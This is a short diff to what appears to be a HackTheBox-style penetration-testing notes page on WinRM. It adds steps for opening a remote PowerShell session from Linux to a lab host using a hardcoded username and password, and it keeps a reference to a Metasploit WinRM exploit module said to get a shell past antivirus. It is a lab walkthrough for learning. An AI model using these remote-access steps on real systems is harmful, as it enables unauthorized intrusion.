@@ -115,3 +115,16 @@ WinRM Script Exec exploit module can obtain a shell without triggering an anti-v
 
 `use exploit/windows/winrm/winrm_script_exec`
 
+## Login from Windows 
+
+This can also be done using `PowerShell` for Linux \(apt install pwsh _or_  apt install powershell\)
+
+```text
+PS /> $pass = ConvertTo-SecureString 'kittycat1' -asplaintext -force
+PS /> $cred = New-Object System.Management.Automation.PSCredential('htb\k.svensson', $pass)
+PS /> Enter-PSSession -Computer 10.10.10.210 -credential $cred -Authentication Negotiate
+[10.10.10.210]: PS>
+```
+
+If you get a error `Unspecified GSS failure` install gss-ntlmssp using apt.
+
